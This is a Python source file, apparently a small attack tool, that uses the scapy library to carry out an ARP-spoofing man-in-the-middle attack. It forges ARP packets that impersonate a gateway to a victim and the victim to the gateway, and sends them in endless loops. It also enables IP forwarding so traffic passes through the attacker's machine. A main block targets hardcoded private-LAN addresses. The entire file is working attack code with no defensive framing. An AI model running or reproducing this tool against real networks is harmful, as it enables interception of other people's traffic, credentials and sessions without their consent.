#from scapy.layers.inet import Ether, ARP, conf
#from scapy.layers.inet import *
#from scapy.sendrecv import *
#from scapy.sendrecv import sendp
from scapy.all import *
from multiprocessing import Process
#from scapy.config import conf

class MITM:
    """
        This class use the arp protocol for establish an man in the middle exploit
    """
    def __init__(self, victim, gateway):
        """
            Init function
            
            Args:
                victim (dict): Describe the victim information for the exploit
                    ip (str): This is the victim IP address 
                    mac (str): This is the victim MAC address
                gateway (dict): Describe the gateway information for the exploit
                    ip (str): This is the gateway IP address 
                    mac (str): This is the gateway MAC address
        """

        MITM.check_params("victim", victim)
        MITM.check_params("gateway", gateway)

        self.victim = victim
        self.gateway = gateway
        self.forging_packets = dict()
        self.pre_build()
        MITM.set_ip_forwarding(True)

    @staticmethod
    def check_params(name_param, param):
        """
            Check type parameters

            Args:
                name_param (str): Indicate the name of the param checking for return a message error
                param (dict): Element for the exploit

            Raise:
                ValueError
        """

        if not isinstance(param, dict):
            raise ValueError("{0} must be a dictionary".format(name_param))

        if not all(isinstance(value, (str, unicode)) for value in param.values()):
            raise ValueError("{0} each value in the dictionary must be a string : {1}".format(name_param, param))

    @staticmethod
    def set_ip_forwarding(status):
        """
            Set the ip forwarding of the attacker machine

            Args:
                status (bool): Represent if the machine will forward ip packets or not

            Raise:
                ValueError
        """

        if not isinstance(status, bool):
            raise ValueError("Status must be a boolean")

        with open('/proc/sys/net/ipv4/ip_forward', 'w') as ip_forwarding:
            ip_forwarding.write('{0}\n'.format(1 if status else 0))

    @staticmethod
    def spoof_someone(forged_packet):
        """
            Send packets forged
        """
        sendp(forged_packet, loop=1, iface="eth0")

    def pre_build(self):
        """
            Pre build packet for the exploit, this is an optimization for scapy.
            The packet is forged once and stored in memory
        """
        self.forging_packets["victim"] = Ether(dst=self.victim["mac"])/ARP(op="who-has",
                                                                           psrc=self.gateway["ip"],
                                                                           pdst=self.victim["ip"])
        self.forging_packets["gateway"] = Ether(dst=self.gateway["mac"])/ARP(op="who-has",
                                                                             psrc=self.victim["ip"],
                                                                             pdst=self.gateway["ip"])

    def start_spoof(self):
        """
            Start the mitm exploit
        """

        victim = Process(target=self.spoof_someone, args=(self.forging_packets["victim"],))
        gateway = Process(target=self.spoof_someone, args=(self.forging_packets["gateway"],))

        try:
            victim.start()
            gateway.start()

        except KeyboardInterrupt:
            victim.terminate()
            gateway.terminate()
            MITM.set_ip_forwarding(False)

if __name__ == "__main__":
    mitm = MITM(
        {"mac": "6c:71:d9:2b:f3:59", "ip": "192.168.0.14"},
        {"mac": "f4:ca:e5:42:f6:c3", "ip": "192.168.0.254"}
    )
    mitm.start_spoof()
